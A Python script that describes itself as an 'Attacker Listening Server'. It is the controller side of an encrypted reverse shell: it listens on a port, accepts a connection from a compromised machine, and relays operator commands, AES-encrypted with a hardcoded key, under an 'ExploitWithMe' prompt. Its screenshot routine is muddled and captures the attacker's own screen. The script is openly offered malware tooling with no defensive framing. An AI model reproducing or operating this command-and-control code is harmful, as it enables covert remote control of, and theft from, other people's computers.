import os
import socket
import sys
from Crypto import Random
from Crypto.Cipher import AES
PORT = 829
HOST = 'localhost'
KEY = '82e672ae054aa4de6f042c888111686a'.encode('utf-8')
def pad(s):
    return s + b'\0' * (AES.block_size - len(s) % AES.block_size)
def encrypt(plaintext):
    plaintext = pad(plaintext)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(plaintext)
def decrypt(ciphertext):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b'\0')
def screen_shot():
    try:
        os.system("pip install pyscreenshot")
        import pyscreenshot as ImageGrab
        im = ImageGrab.grab()
        im.show()
        im = ImageGrab.grab(bbox=(10, 10, 500, 500))
        im.show()
        ImageGrab.grab_to_file('im.png')
    except Exception as e:
        print("An error occurred while taking a screenshot:", str(e))
def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen(10)
        print(f'Attacker Listening Server Started on Port {PORT}...')
        conn, _ = s.accept()
        with conn:
            while True:
                cmd = input('ExploitWithMe >> ').strip()
                if cmd == 'grab_screen':
                    screen_shot()
                    os.system("cat im.png")
                if cmd == '':
                    continue
                conn.send(encrypt(cmd.encode('utf-8')))
                if cmd == 'terminate':
                    sys.exit(0)
                data = conn.recv(4096)
                print(decrypt(data).decode('utf-8'))
if __name__ == '__main__':
    main()